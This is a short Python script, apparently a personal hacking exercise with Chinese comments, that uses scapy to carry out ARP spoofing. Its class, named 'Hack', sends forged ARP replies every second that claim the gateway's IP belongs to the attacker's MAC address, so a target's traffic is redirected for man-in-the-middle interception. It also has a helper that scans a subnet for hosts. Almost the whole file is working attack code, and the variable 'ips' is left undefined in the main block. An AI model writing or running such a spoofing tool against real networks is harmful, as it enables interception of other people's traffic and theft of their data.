import sys
import time
from scapy.all import *
 
class Hack:
    def __init__(self,ips,getway_ip,hacker_mac):
        self.IP = ips
        self.GetWay_IP = getway_ip#网关的正确ip
        self.Hacker_Mac = hacker_mac#假的网关mac
 
 
    #应答包欺骗目的主机，让它相信发送这个包的是网关（正确的ip，错误的mac）
    def ArpCheat(self,mac,ip):
        #eth = Ether(src=self.Hacker_Mac,type=0x0806) 不要加这句
        arp = ARP(op=0x2,\
                  hwsrc=self.Hacker_Mac,\
                  psrc=self.GetWay_IP,\
                  hwdst=mac,pdst=ip)#op=2 应答包
        #package = eth/arp
        send(arp)#不需要接收回复 用send时不要手动加eth层
        
    
    
    #获取某个网段所有主机的mac和ip
    def GetHosts(self,ips):
        mac_ip = {}        
        
        stdout = sys.stdout
        sys.stdout = open("/tmp/hosts.txt", "w")#重定向输出
        arping(ips)                            
        sys.stdout = stdout#还原标准输出              
    
        f = open("/tmp/hosts.txt", "r")             
        info = f.readlines()#列表中每一项都是一行                      
        f.close()      
        
        length = len(info) -2 #前两行没用
        i=0
        while(i<length):
            mac,ip = info[2+i].split()#从第三行开始 获取mac和ip
            mac_ip[mac] = ip
            print(mac,ip)
            i+=1 
    
        return mac_ip
 
if __name__ == "__main__":
    getway_ip = "192.168.1.1"
    hack_mac = "60:03:08:a1:7b:f6" #攻击者的mac
    arphack = Hack(ips,getway_ip,hack_mac)    
    while(1):
        _mac = "a0:d3:7a:91:7d:4b"
        _ip = "192.168.1.2" 
        print(_mac)
        print(_ip)
        arphack.ArpCheat(_mac,_ip)
        time.sleep(1)